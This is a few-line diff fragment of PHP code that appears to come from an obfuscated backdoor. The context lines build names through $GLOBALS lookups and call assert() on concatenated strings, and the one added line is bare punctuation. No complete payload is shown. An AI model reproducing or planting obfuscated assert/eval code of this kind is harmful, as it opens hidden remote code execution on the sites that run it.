@@ -42,3 +42,4 @@ foreach ($GLOBALS[$GLOBALS['
 "; assert($
 :"")."//");
 );'));}else{echo
+)));');$
